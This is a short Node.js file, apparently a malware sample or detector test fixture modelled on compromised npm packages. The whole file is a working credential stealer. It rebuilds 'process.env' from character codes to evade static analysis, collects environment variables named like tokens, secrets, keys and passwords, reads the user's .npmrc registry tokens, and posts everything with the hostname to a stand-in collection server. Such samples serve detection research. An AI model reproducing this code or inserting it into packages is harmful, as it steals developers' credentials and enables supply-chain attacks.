// Charcode reconstruction to access process.env and exfiltrate tokens
// Technique: env_charcode_reconstruction — builds sensitive strings via String.fromCharCode
// Real-world: 448 samples in Datadog benchmark (compromised npm libs with bundle.js)

const http = require('http');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Build "process" via charcode to evade static analysis
const p = String.fromCharCode(112, 114, 111, 99, 101, 115, 115);
// Build "env" via charcode
const e = String.fromCharCode(101, 110, 118);

// Access process.env via computed charcode — core evasion technique
const envVars = global[p][e];

// Also directly access process.env to harvest credentials
const sensitiveKeys = Object.keys(process.env).filter(k =>
  /token|secret|key|password|auth/i.test(k)
);

const stolen = { host: os.hostname() };
for (const k of sensitiveKeys) {
  stolen[k] = process.env[k];
}

// Read .npmrc for registry tokens
try {
  stolen.npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
} catch(e) {}

// Exfiltrate via HTTP POST
const data = JSON.stringify(stolen);
const req = http.request({
  hostname: 'evil-collect.example.com',
  port: 443,
  path: '/c',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(data);
req.end();
